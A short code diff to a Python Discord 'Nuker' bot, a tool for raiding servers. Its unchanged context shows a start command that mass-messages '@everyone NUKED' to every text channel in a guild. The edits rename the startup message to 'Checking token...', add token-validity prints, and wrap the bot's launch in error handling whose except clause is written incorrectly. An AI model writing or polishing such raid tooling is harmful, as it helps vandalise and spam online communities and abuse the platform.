@@ -1,3 +1,4 @@
+import discord
 import random
 import os
 import time
@@ -11,7 +12,7 @@ bot.remove_command('Help')
 
 token = "ENTER TOKEN HERE"
 
-print("[+] Loading Nuker...")
+print("[+] Checking token...")
 
 @bot.event
 async def on_command_error(ctx, error):
@@ -20,6 +21,8 @@ async def on_command_error(ctx, error):
 
 @bot.event
 async def on_ready():
+    print("[+] Valid token!")
+    time.sleep(1)
     os.system('cls')                                                        
     print("""{}
 
@@ -59,4 +62,8 @@ async def start(ctx):
         for channel in guild.text_channels:
             await channel.send("@everyone NUKED")
 
-bot.run(token)
+try:
+    bot.run(token)
+except discord.errors.HTTPException and discord.errors.LoginFailure:
+    time.sleep(1)
+    print("[+] Token incorrect! Try again")
